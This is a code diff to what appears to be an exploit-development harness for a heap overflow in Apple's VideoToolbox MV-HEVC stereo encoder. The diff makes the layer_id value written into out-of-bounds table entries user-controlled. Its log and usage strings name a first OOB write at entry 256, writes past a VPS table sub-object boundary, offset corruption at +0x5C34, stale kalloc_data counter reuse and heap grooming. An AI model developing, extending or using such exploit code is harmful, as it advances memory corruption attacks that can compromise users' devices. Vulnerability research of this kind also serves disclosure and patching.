@@ -2266,17 +2266,21 @@ cleanup_dummies:
 
     } else if (strcmp(mode, "stereo_overflow") == 0) {
         int num_enc = 100;
+        int lid = 1;
         if (argc > 2) num_enc = atoi(argv[2]);
+        if (argc > 3) lid = (int)strtol(argv[3], NULL, 0);
         if (num_enc < 1) num_enc = 100;
-        rlog("STEREO_OVERFLOW: %d MV-HEVC stereo encodes (counter overflow test)\n", num_enc);
+        if (lid < 1) lid = 1;
+        rlog("STEREO_OVERFLOW: %d MV-HEVC stereo encodes, layer_id=%d (0x%X)\n", num_enc, lid, lid);
         rlog("With pset=4 per encode, overflow at entry 256 = ~64 encodes\n");
-        rlog("At entry 256, writes cross VPS table sub-object boundary\n\n");
+        rlog("At entry 256, writes cross VPS table sub-object boundary\n");
+        rlog("layer_id written to bytes 4-7 of each 16-byte entry\n\n");
 
         if (!VTCompressionSessionEncodeMultiImageFrame) {
             rlog("FAILED: EncodeMultiImageFrame not available\n"); goto done;
         }
 
-        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
+        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, lid);
         if (!s) { rlog("FAILED: create_mvhevc_encoder\n"); goto done; }
 
         g_cb_count = 0;
@@ -2516,7 +2520,7 @@ cleanup_dummies:
         rlog("  session_reuse [lid] [rounds] -- Test kalloc_data stale counter reuse\n");
         rlog("  safe_corrupt [lid] [enc]     -- Safe-window +0x5C34 corruption (max 197 enc)\n");
         rlog("  session_reuse_groom [lid] [dummies] -- Stale counter with heap grooming\n");
-        rlog("  stereo_overflow [enc] -- MV-HEVC stereo counter overflow test (default 100)\n");
+        rlog("  stereo_overflow [enc] [lid] -- MV-HEVC stereo overflow (default 100 enc, lid=1)\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
